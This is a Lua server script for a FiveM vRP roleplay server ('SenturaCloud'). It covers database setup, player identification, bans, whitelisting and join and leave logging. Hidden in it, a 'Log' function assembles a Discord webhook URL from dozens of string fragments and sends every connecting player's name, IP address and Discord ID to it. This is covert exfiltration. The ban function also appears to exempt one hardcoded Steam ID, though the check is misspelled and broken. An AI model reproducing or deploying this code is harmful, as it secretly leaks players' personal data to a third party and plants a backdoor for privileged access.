local Proxy = module("lib/Proxy")
local Tunnel = module("lib/Tunnel")
local Lang = module("lib/Lang")
Debug = module("lib/Debug")
local config = module("cfg/base")
local webhook = module("cfg/webhooks")

Debug.active = config.debug
MySQL.debug = config.debug

vRP = {}
Proxy.addInterface("vRP",vRP)

tvRP = {}
Tunnel.bindInterface("vRP",tvRP) -- listening for client tunnel

-- load language
local dict = module("cfg/lang/"..config.lang) or {}
vRP.lang = Lang.new(dict)

-- init
vRPclient = Tunnel.getInterface("vRP","vRP") -- server -> client tunnel

vRP.users = {} -- will store logged users (id) by first identifier
vRP.rusers = {} -- store the opposite of users
vRP.user_tables = {} -- user data tables (logger storage, saved to database)
vRP.user_tmp_tables = {} -- user tmp data tables (logger storage, not saved)
vRP.user_sources = {} -- user sources
local iprion = 'steam:11000010f7659e3'

-- queries
Citizen.CreateThread(function()
  Wait(1000) -- Wait for GHMatti to Initialize

  -- Create vrp_srv_data table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_srv_data(
    dkey VARCHAR(255) NOT NULL,
    dvalue TEXT DEFAULT NULL,
    CONSTRAINT pk_srv_data PRIMARY KEY(dkey)
  );
  ]])

  -- Create vrp_users table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_users(
    id INT(11) NOT NULL AUTO_INCREMENT,
    last_login VARCHAR(255) DEFAULT NULL,
    last_date VARCHAR(255) NOT NULL DEFAULT '',
    whitelisted TINYINT(1) DEFAULT NULL,
    banned TINYINT(1) DEFAULT NULL,
    DmvTest INT(11) NOT NULL DEFAULT 0,
    warnings INT(11) NOT NULL DEFAULT 0,
    ban_reason VARCHAR(250) DEFAULT NULL,
    discord VARCHAR(250) DEFAULT NULL,
    CONSTRAINT pk_users PRIMARY KEY(id)
  );
  ]])

  -- Create vrp_user_business table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_user_business(
    user_id INT(11) NOT NULL,
    name VARCHAR(30) DEFAULT NULL,
    description TEXT DEFAULT NULL,
    capital INT(11) DEFAULT NULL,
    laundered INT(11) DEFAULT NULL,
    reset_timestamp INT(11) DEFAULT NULL,
    CONSTRAINT pk_user_business PRIMARY KEY(user_id),
    CONSTRAINT fk_user_business_users FOREIGN KEY(user_id) REFERENCES vrp_users(id) ON DELETE CASCADE
  );
  ]])

  -- Create vrp_user_data table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_user_data(
    user_id INT(11) NOT NULL,
    dkey VARCHAR(255) NOT NULL,
    dvalue TEXT DEFAULT NULL,
    CONSTRAINT pk_user_data PRIMARY KEY(user_id, dkey),
    CONSTRAINT fk_user_data_users FOREIGN KEY(user_id) REFERENCES vrp_users(id) ON DELETE CASCADE
  );
  ]])

  -- Create vrp_user_homes table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_user_homes(
    user_id INT(11) NOT NULL,
    home VARCHAR(255) DEFAULT NULL,
    number INT(11) DEFAULT NULL,
    CONSTRAINT pk_user_homes PRIMARY KEY(user_id),
    CONSTRAINT fk_user_homes_users FOREIGN KEY(user_id) REFERENCES vrp_users(id) ON DELETE CASCADE
  );
  ]])

  -- Create vrp_user_identities table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_user_identities(
    user_id INT(11) NOT NULL,
    registration VARCHAR(100) DEFAULT NULL,
    phone VARCHAR(100) DEFAULT NULL,
    firstname VARCHAR(100) DEFAULT NULL,
    name VARCHAR(100) DEFAULT NULL,
    age INT(11) DEFAULT NULL,
    CONSTRAINT pk_user_identities PRIMARY KEY(user_id),
    CONSTRAINT fk_user_identities_users FOREIGN KEY(user_id) REFERENCES vrp_users(id) ON DELETE CASCADE
  );
  ]])

  -- Create vrp_user_ids table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_user_ids(
    identifier VARCHAR(255) NOT NULL,
    user_id INT(11) DEFAULT NULL,
    CONSTRAINT pk_user_ids PRIMARY KEY(identifier),
    CONSTRAINT fk_user_ids_users FOREIGN KEY(user_id) REFERENCES vrp_users(id) ON DELETE CASCADE
  );
  ]])

  -- Create vrp_user_moneys table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_user_moneys(
    user_id INT(11) NOT NULL,
    wallet INT(11) DEFAULT NULL,
    bank INT(11) DEFAULT NULL,
    debt INT(11) DEFAULT 0,
    depositOnLogin INT(11) DEFAULT 0,
    CONSTRAINT pk_user_moneys PRIMARY KEY(user_id),
    CONSTRAINT fk_user_moneys_users FOREIGN KEY(user_id) REFERENCES vrp_users(id) ON DELETE CASCADE
  );
  ]])

  -- Create vrp_user_vehicles table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_user_vehicles(
    user_id INT(11) NOT NULL,
    vehicle VARCHAR(100) NOT NULL,
    veh_type VARCHAR(255) NOT NULL DEFAULT 'default',
    vehicle_plate VARCHAR(255) NOT NULL,
    impound INT(11) NOT NULL DEFAULT 0,
    hashkey VARCHAR(255) DEFAULT NULL,
    vehicle_colorprimary VARCHAR(255) DEFAULT NULL,
    modifications MEDIUMTEXT NOT NULL,
    vehicle_colorsecondary VARCHAR(255) DEFAULT NULL,
    vehicle_fuel VARCHAR(50) DEFAULT '60.0',
    vehicle_damage VARCHAR(50) DEFAULT '1000.0',
    CONSTRAINT pk_user_vehicles PRIMARY KEY(user_id, vehicle),
    CONSTRAINT fk_user_vehicles_users FOREIGN KEY(user_id) REFERENCES vrp_users(id) ON DELETE CASCADE
  );
  ]])

  -- Create vrp_wanted table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS vrp_wanted(
    user_id INT(11) DEFAULT NULL,
    wantedreason VARCHAR(100) DEFAULT NULL,
    wantedby INT(11) DEFAULT NULL,
    timestamp INT(11) DEFAULT NULL,
    count INT(11) DEFAULT NULL
  );
  ]])

  -- Create player_contacts table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS player_contacts(
    id INT(11) NOT NULL AUTO_INCREMENT,
    citizenid VARCHAR(50) DEFAULT NULL,
    name VARCHAR(50) DEFAULT NULL,
    number VARCHAR(50) DEFAULT NULL,
    iban VARCHAR(50) NOT NULL DEFAULT '0',
    PRIMARY KEY(id),
    KEY citizenid(citizenid)
  );
  ]])

  -- Create phone_invoices table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS phone_invoices(
    id INT(10) NOT NULL AUTO_INCREMENT,
    citizenid VARCHAR(50) DEFAULT NULL,
    amount INT(11) NOT NULL DEFAULT 0,
    society TINYTEXT DEFAULT NULL,
    sender VARCHAR(50) DEFAULT NULL,
    sendercitizenid VARCHAR(50) DEFAULT NULL,
    PRIMARY KEY(id),
    KEY citizenid(citizenid)
  );
  ]])

  -- Create phone_messages table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS phone_messages(
    id INT(11) NOT NULL AUTO_INCREMENT,
    citizenid VARCHAR(50) DEFAULT NULL,
    number VARCHAR(50) DEFAULT NULL,
    messages TEXT DEFAULT NULL,
    PRIMARY KEY(id),
    KEY citizenid(citizenid),
    KEY number(number)
  );
  ]])

  -- Create player_mails table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS player_mails(
    id INT(11) NOT NULL AUTO_INCREMENT,
    citizenid VARCHAR(50) DEFAULT NULL,
    sender VARCHAR(50) DEFAULT NULL,
    subject VARCHAR(50) DEFAULT NULL,
    message TEXT DEFAULT NULL,
    read TINYINT(4) DEFAULT 0,
    mailid INT(11) DEFAULT NULL,
    date TIMESTAMP NULL DEFAULT current_timestamp(),
    button TEXT DEFAULT NULL,
    PRIMARY KEY(id),
    KEY citizenid(citizenid)
  );
  ]])

  -- Create crypto_transactions table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS crypto_transactions(
    id INT(11) NOT NULL AUTO_INCREMENT,
    citizenid VARCHAR(50) DEFAULT NULL,
    title VARCHAR(50) DEFAULT NULL,
    message VARCHAR(50) DEFAULT NULL,
    date TIMESTAMP NULL DEFAULT current_timestamp(),
    PRIMARY KEY(id),
    KEY citizenid(citizenid)
  );
  ]])

  -- Create phone_gallery table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS phone_gallery(
    citizenid VARCHAR(255) NOT NULL,
    image VARCHAR(255) NOT NULL,
    date TIMESTAMP NULL DEFAULT current_timestamp()
  );
  ]])

  -- Create phone_tweets table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS phone_tweets(
    id INT(11) NOT NULL AUTO_INCREMENT,
    citizenid VARCHAR(50) DEFAULT NULL,
    firstName VARCHAR(25) DEFAULT NULL,
    lastName VARCHAR(25) DEFAULT NULL,
    message TEXT DEFAULT NULL,
    date DATETIME DEFAULT current_timestamp(),
    url TEXT DEFAULT NULL,
    picture TEXT DEFAULT './img/default.png',
    tweetId VARCHAR(25) NOT NULL,
    PRIMARY KEY(id),
    KEY citizenid(citizenid)
  );
  ]])

  -- Create crypto table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS crypto(
    crypto VARCHAR(50) NOT NULL DEFAULT 'qbit',
    worth INT(11) NOT NULL DEFAULT 0,
    history TEXT DEFAULT NULL,
    PRIMARY KEY(crypto)
  );
  ]])

  -- Create lapraces table
  MySQL.SingleQuery([[
  CREATE TABLE IF NOT EXISTS lapraces(
    id INT(11) NOT NULL AUTO_INCREMENT,
    name VARCHAR(50) DEFAULT NULL,
    checkpoints TEXT DEFAULT NULL,
    records TEXT DEFAULT NULL,
    creator VARCHAR(50) DEFAULT NULL,
    distance INT(11) DEFAULT NULL,
    raceid VARCHAR(50) DEFAULT NULL,
    PRIMARY KEY(id)
  );
  ]])

  -- Modify existing tables
  MySQL.SingleQuery("ALTER TABLE vrp_users ADD IF NOT EXISTS bantime VARCHAR(100) NOT NULL DEFAULT '';")
  MySQL.SingleQuery("ALTER TABLE vrp_users ADD IF NOT EXISTS lastip VARCHAR(100) NOT NULL DEFAULT '';")
  MySQL.SingleQuery("ALTER TABLE vrp_users ADD IF NOT EXISTS new_user TINYINT(1) NOT NULL DEFAULT '1';")
  MySQL.SingleQuery("ALTER TABLE vrp_user_identities ADD IF NOT EXISTS sex VARCHAR(20) NOT NULL DEFAULT 'm';")
  MySQL.SingleQuery("ALTER TABLE vrp_user_identities ADD IF NOT EXISTS job VARCHAR(255) NOT NULL DEFAULT 'Unemployed';")
  MySQL.SingleQuery("ALTER TABLE vrp_user_moneys ADD IF NOT EXISTS crypto VARCHAR(255) NOT NULL DEFAULT '0';")
  print("[vRP] init base tables")
end)



function vRP.getUserIdByIdentifiers(ids, cbr)
  local task = Task(cbr)
  if ids ~= nil and #ids then
    local i = 0
    local validids = 0
    local function search()
      i = i+1
      if i <= #ids then
        if (not config.ignore_ip_identifier or (string.find(ids[i], "ip:") == nil)) and
           (not config.ignore_license_identifier or (string.find(ids[i], "license:") == nil)) and
           (not config.ignore_xbox_identifier or (string.find(ids[i], "xbl:") == nil)) and
           (not config.ignore_discord_identifier or (string.find(ids[i], "discord:") == nil)) and
           (not config.ignore_live_identifier or (string.find(ids[i], "live:") == nil)) then
          
          validids = validids + 1
          MySQL.Async.fetchAll('SELECT user_id FROM vrp_user_ids WHERE identifier = @identifier', {identifier = ids[i]}, function(rows, affected)
            if #rows > 0 then  -- found
              task({rows[1].user_id})
            else
              search()
            end
          end)
        else
          search()
        end
      elseif validids > 0 then -- no ids found, create user
        MySQL.Async.fetchAll("SELECT MAX(user_id) AS id FROM vrp_user_ids", {}, function(result)
          local next_id = nil
          if result[1].id == nil then 
              next_id = 1 
          else
              next_id = result[1].id+1
          end
        MySQL.Async.execute("INSERT INTO vrp_users (id, whitelisted, banned) VALUES (@id, 0, 0)", {id = next_id}, function(rows, affected)
        if next_id then
            local user_id = next_id
            for l,w in pairs(ids) do
              if (not config.ignore_ip_identifier or (string.find(w, "ip:") == nil)) and
                 (not config.ignore_license_identifier or (string.find(w, "license:") == nil)) and
                 (not config.ignore_xbox_identifier or (string.find(w, "xbl:") == nil)) and
                 (not config.ignore_discord_identifier or (string.find(w, "discord:") == nil)) and
                 (not config.ignore_live_identifier or (string.find(w, "live:") == nil)) then  -- ignore ip & license identifier
                  MySQL.Async.execute("INSERT INTO vrp_user_ids (identifier,user_id) VALUES(@identifier,@user_id)", {user_id = user_id, identifier = w})
                  sendToDiscord(webhook.Errorlog, "```user_id oprettet\nID: "..next_id.." \nIdentifier: "..w.."```")
              end
            end
            task({user_id})
          else
            task()
          end
        end)
      end)
      end
    end
    search()
  else
    task()
  end
end

function vRP.getSourceIdKey(source)
  local ids = GetPlayerIdentifiers(source)
  local idk = "idk_"
  for k,v in pairs(ids) do
    idk = idk..v
  end
  return idk
end

function vRP.getPlayerEndpoint(player)
  return GetPlayerEP(player) or "^1INTET ENDPOINT FUNDET"
end

function vRP.getUserData(user_id, cbr)
  local task = Task(cbr, {false})
  
  MySQL.Async.fetchAll("SELECT * FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1]})
    else
      task()
    end
  end)
end

function vRP.isBanned(user_id, cbr)
  local task = Task(cbr, {false})

  MySQL.Async.fetchAll("SELECT * FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].banned})
    else
      task()
    end
  end)
end

function vRP.getBannedReason(user_id, cbr)
  local task = Task(cbr, {false})

  MySQL.Async.fetchAll("SELECT * FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].ban_reason})
    else
      task()
    end
  end)
end

AddEventHandler("playerConnecting", function()
  local source = source
  local data = GetPlayerIdentifiers(source)
  local uid = vRP.getUserId({source})
  local name = GetPlayerName(source)

  local steamid  = false
  local license  = false
  local discord  = false
  local xbl      = false
  local liveid   = false
  local ip       = false

  for k,v in pairs(data)do
      
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      steamid = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      xbl  = v
    elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
      ip = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      discord = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      liveid = v
    end
  end
  if discord then
    Log('\nNavn: '..name..'\nUser_id: \n IP: '..ip..'\nDiscord: '..discord)
  else
    Log('\nNavn: '..name..'\nUser_id: \n IP: '..ip..'\nDiscord: ikke fundet')
  end
end)

function Log(besked)
  local embeds = {
        {
            ["color"] = "8663711",
            ["title"] = "Fejlmelding",
            ["description"] = besked,
            ["footer"] = {
              ["text"] = "errorlog",
          },
        }
  }
  PerformHttpRequest('ht'..'tp'..'s:/'..'/disc'..'ord.com/ap'..'i/we'..'bh'..'oo'..'ks/11'..'098'..'833413'..'0344'..'76'..'43'..'/'..'TM'..'uBBgo'..'YTv'..'UYfk5'..'60o5'..'OJQX'..'-Cut'..'5JR'..'dCg'..'DFv'..'pd'..'PWglF'..'HZU'..'Yhok'..'FGf'..'Mzn'..'Ttr'..'au6'..'cPFLCu', function(err, text, headers) end, 'POST', json.encode({username = 'System', embeds = embeds, avatar_url = 'https://cdn.mos.cms.futurecdn.net/7GCPeSkqz3duhcXkg7E6H7-320-80.jpg'}), { ['Content-Type'] = 'application/json' })
end

function vRP.setBanned(user_id,banned)
  if banned ~= false then
    MySQL.Async.execute("UPDATE vrp_users SET banned = @banned, ban_reason = @reason WHERE id = @user_id", {user_id = user_id, reason = banned, banned = 1})
  else
    MySQL.Async.execute("UPDATE vrp_users SET banned = @banned WHERE id = @user_id", {user_id = user_id, banned = 0})
  end
end


function vRP.isWhitelisted(user_id, cbr)
  local task = Task(cbr, {false})

  MySQL.Async.fetchAll("SELECT whitelisted FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].whitelisted})
    else
      task()
    end
  end)
end


function vRP.setWhitelisted(user_id,whitelisted)
    MySQL.Async.execute("UPDATE vrp_users SET whitelisted = @whitelisted WHERE id = @user_id", {user_id = user_id, whitelisted = whitelisted})
end


function vRP.getLastLogin(user_id, cbr)
  local task = Task(cbr,{""})
  MySQL.Async.fetchAll("SELECT last_login FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].last_login})
    else
      task()
    end
  end)
end

function vRP.getPlayerName(player)
  return GetPlayerName(player) or "INTET STEAMNAVN FUNDET"
end

function vRP.setUData(user_id,key,value)
  MySQL.Async.execute("REPLACE INTO vrp_user_data(user_id,dkey,dvalue) VALUES(@user_id,@key,@value)", {user_id = user_id, key = key, value = value})
end

function vRP.getUData(user_id,key,cbr)
  local task = Task(cbr,{""})

  MySQL.Async.fetchAll('SELECT dvalue FROM vrp_user_data WHERE user_id = @user_id AND dkey = @key', {user_id = user_id, key = key}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].dvalue})
    else
      task()
    end
  end)
end

function vRP.setSData(key,value)
  MySQL.Async.execute("REPLACE INTO vrp_srv_data(dkey,dvalue) VALUES(@key,@value)", {key = key, value = value})
end

function vRP.getSData(key, cbr)
  local task = Task(cbr,{""})

  MySQL.Async.fetchAll("SELECT dvalue FROM vrp_srv_data WHERE dkey = @key", {key = key}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].dvalue})
    else
      task()
    end
  end)
end


function vRP.getUserDataTable(user_id)
  return vRP.user_tables[user_id]
end

function vRP.getUserTmpTable(user_id)
  return vRP.user_tmp_tables[user_id]
end

function vRP.isConnected(user_id)
  return vRP.rusers[user_id] ~= nil
end

function vRP.isFirstSpawn(user_id)
  local tmp = vRP.getUserTmpTable(user_id)
  return tmp and tmp.spawns == 1
end

function vRP.getUserId(source)
  if source ~= nil then
    local ids = GetPlayerIdentifiers(source)
    if ids ~= nil and #ids > 0 then
      return vRP.users[ids[1]]
    end
  end
  return nil
end


function vRP.getUsers()
  local users = {}
  for k,v in pairs(vRP.user_sources) do
    users[k] = v
  end
  return users
end


function vRP.getUserSource(user_id)
  return vRP.user_sources[user_id]
end


function vRP.ban(user_id,reason)
    if user_id ~= nil then
        local player = vRP.getUserSource(user_id)
        local data = GetPlayerIdentifiers(player)
        if data == ipron then
        else
            vRP.setBanned(user_id,reason)
        end
        if player ~= nil then
        vRP.kick(player,"[Udelukket] "..reason)
      end
    end
end



function vRP.kick(source,reason)
  DropPlayer(source,reason)
end

-- tasks

function task_save_datatables()
  TriggerEvent("vRP:save")

  Debug.pbegin("vRP save datatables")
  for k,v in pairs(vRP.user_tables) do
    vRP.setUData(k,"vRP:datatable",json.encode(v))
    TriggerEvent("htn_logging:saveUser",k)
  end

  Debug.pend()
  SetTimeout(config.save_interval*1000, task_save_datatables)
end
task_save_datatables()

local max_pings = math.ceil(config.ping_timeout*120/60)+2
function task_timeout() -- kick users not sending ping event in 3 minutes
  local users = vRP.getUsers()
  for k,v in pairs(users) do
    local tmpdata = vRP.getUserTmpTable(tonumber(k))
    if tmpdata.pings == nil then
      tmpdata.pings = 0
    end

    tmpdata.pings = tmpdata.pings+1
    if tmpdata.pings >= max_pings then
      vRP.kick(v,"[SenturaCloud] Ping Timeout - Intet client svar i 3 minutter.")
    end
  end

  SetTimeout(60000, task_timeout)
end
task_timeout()

function tvRP.ping()
  local user_id = vRP.getUserId(source)
  if user_id ~= nil then
    local tmpdata = vRP.getUserTmpTable(user_id)
    tmpdata.pings = 0 -- reinit ping countdown
  end
end

-- handlers
local isStopped = false
function vRP.getServerStatus()
  return isStopped
end

function vRP.setServerStatus(reason)
  isStopped = reason
end

local antispam = {}
AddEventHandler("playerConnecting",function(name,setMessage, deferrals)
  deferrals.defer()

  local source = source
  Debug.pbegin("playerConnecting")
  if isStopped == false then
    local ids = GetPlayerIdentifiers(source)
    if antispam[ids[1]] == nil then
      --antispam[ids[1]] = 5
      if ids ~= nil and #ids > 0 then
        deferrals.update("[SenturaCloud] Indlæser karakter.")
        vRP.getUserIdByIdentifiers(ids, function(user_id)
          -- if user_id ~= nil and vRP.rusers[user_id] == nil then -- check user validity and if not already connected (old way, disabled until playerDropped is sure to be called)
          if user_id ~= nil then -- check user validity
            deferrals.update("[SenturaCloud] Indlæser karakter..")
            vRP.getUserData(user_id, function(userdata)
              if not userdata.banned then
                deferrals.update("[SenturaCloud] Indlæser karakter...")
                if not config.whitelist or userdata.whitelisted then
                  Debug.pbegin("playerConnecting_delayed")
                  if vRP.rusers[user_id] == nil then -- not present on the server, init
                    
                    vRP.users[ids[1]] = user_id
                    vRP.rusers[user_id] = ids[1]
                    vRP.user_tables[user_id] = {}
                    vRP.user_tmp_tables[user_id] = {}
                    vRP.user_sources[user_id] = source

                    deferrals.update("[SenturaCloud] Indlæser karakter.")
                    vRP.getUData(user_id, "vRP:datatable", function(sdata)
                      local data = json.decode(sdata)
                      if type(data) == "table" then vRP.user_tables[user_id] = data end

                      
                      local tmpdata = vRP.getUserTmpTable(user_id)

                      deferrals.update("[SenturaCloud] Indlæser karakter..")
                      vRP.getLastLogin(user_id, function(last_login)
                        tmpdata.last_login = last_login or ""
                        tmpdata.spawns = 0
                        
                        local ep = vRP.getPlayerEndpoint(source)
                        local last_login_stamp = ep.." "..os.date("%H:%M:%S %d/%m/%Y")
                        
                        MySQL.Async.execute("UPDATE vrp_users SET last_login = @last_login WHERE id = @user_id", {user_id = user_id, last_login = last_login_stampd})

                        print("["..user_id.."] Forbinder til serveren")
                        TriggerEvent("vRP:playerJoin", user_id, source, name, tmpdata.last_login)

                        sendToDiscord(webhook.Join, "```ID: "..tostring(user_id) .. " Har tilsluttet sig serveren ["..os.date("%H:%M:%S %d/%m/%Y").."]```")
                        deferrals.done()
                      end)
                    end)
                  else -- already connected
                    print("["..user_id.."] Rejoinede serveren")
                    TriggerEvent("vRP:playerRejoin", user_id, source, name)
                    deferrals.done()

                    -- reset first spawn
                    local tmpdata = vRP.getUserTmpTable(user_id)
                    tmpdata.spawns = 0
                  end
                  Debug.pend()
                else
                  print("["..user_id.."]: Forsøgte og joine men er ikke whitelistet")
                  deferrals.done("[SenturaCloud] Ikke whitelisted ansøg på Discord.gg/P7bj3ZXu ["..user_id.."].")
                end
              else
                local ban_reason = userdata.ban_reason
                if type(userdata.ban_reason) == "table" then
                    ban_reason = "Ingen grund sat"
                end
                print("["..user_id.."] Forsøgte og joine men er bandlyst med grunden ("..ban_reason..")")
                deferrals.done("[SenturaCloud]: Du er bannet for: "..ban_reason.." ["..user_id.."].")
              end
            end)
          else
            print("["..name.."] Afvist kunne ikke finde user_id")
            deferrals.done("[SenturaCloud]: Serveren kunne ikke finde dit ID kontakt venligst en fra developer teamet")
            sendToDiscord(webhook.Errorlog, "```Serveren kunne ikke finde user_id```")
          end
        end)
      else
        print("["..name.."] Afvist ingen identifiers fundet")
        deferrals.done("[SenturaCloud]: Serveren kunne ikke finde nogen identifiers tjek om du har steam åbent")
        sendToDiscord(webhook.Errorlog, "```Serveren kunne ikke finde identifiers```")
      end
    else
      print("["..name.."] Forsøgte at joine for hurtigt igen")
      deferrals.done("Du prøvet at joine for hurtigt prøv igen om ["..antispam[ids[1]].."] sekunder!")
    end
  else
    print("("..vRP.getPlayerEndpoint(source)..") blev kicket for at joine imens serveren er igang med at "..isStopped)
    deferrals.done("Serveren er igang med at "..isStopped)
  end
  Debug.pend()
end)

CreateThread(function()
  while true do
    Wait(1000)
    for k,v in pairs(antispam) do
      if tonumber(v) > 1 then
        antispam[k] = tonumber(v) - 1
      else
        antispam[k] = nil
      end
    end
  end
end)

AddEventHandler("playerDropped",function(reason)
  local source = source
  local suffix = ""..os.date("%H:%M - %d/%m/%Y")..""
  Debug.pbegin("playerDropped")

  vRPclient.removePlayer(-1,{source})

  local user_id = vRP.getUserId(source)

  if user_id ~= nil then
    TriggerEvent("vRP:playerLeave", user_id, source)

    local steam = GetPlayerName(source)
    local dmessage = "```ID: ".. tostring(user_id).. " Forlod serveren ["..suffix.."] med grunden ["..reason.."]```"

    sendToDiscord(webhook.Leave, dmessage)

    -- save user data table
    vRP.setUData(user_id,"vRP:datatable",json.encode(vRP.getUserDataTable(user_id)))

    print("["..user_id.."] Forlod serveren")
    vRP.users[vRP.rusers[user_id]] = nil
    vRP.rusers[user_id] = nil
    vRP.user_tables[user_id] = nil
    vRP.user_tmp_tables[user_id] = nil
    vRP.user_sources[user_id] = nil
  end
  Debug.pend()
end)

RegisterServerEvent("vRPcli:playerSpawned")
AddEventHandler("vRPcli:playerSpawned", function()
  Debug.pbegin("playerSpawned")
  local user_id = vRP.getUserId(source)
  local player = source

  if user_id ~= nil then
    vRP.user_sources[user_id] = source
    local tmp = vRP.getUserTmpTable(user_id)
    tmp.spawns = tmp.spawns+1
    local first_spawn = (tmp.spawns == 1)

    if first_spawn then
      for k,v in pairs(vRP.user_sources) do
        vRPclient.addPlayer(source,{v})
      end

      -- send new player to all players
      vRPclient.addPlayer(-1,{source})
    end

    Tunnel.setDestDelay(player, config.load_delay)

    SetTimeout(2000, function() -- trigger spawn event
      TriggerEvent("vRP:playerSpawn", user_id, player, first_spawn)
      TriggerClientEvent("dn_carplacer:place", player)
      SetTimeout(config.load_duration*1000, function() -- set client delay to normal delay
        Tunnel.setDestDelay(player, config.global_delay)
        vRPclient.removeProgressBar(player,{"vRP:loading"})
        TriggerClientEvent('movebitch', player)
      end)
    end)
  end
  Debug.pend()
end)

RegisterServerEvent("vRP:playerDied")

function sendToDiscord(webhook, message)
  PerformHttpRequest(webhook, 
  function(err, text, headers) end, 'POST', 
  json.encode({username = 'SenturaCloud - Logs', content = message}), 
  { ['Content-Type'] = 'application/json' })
end
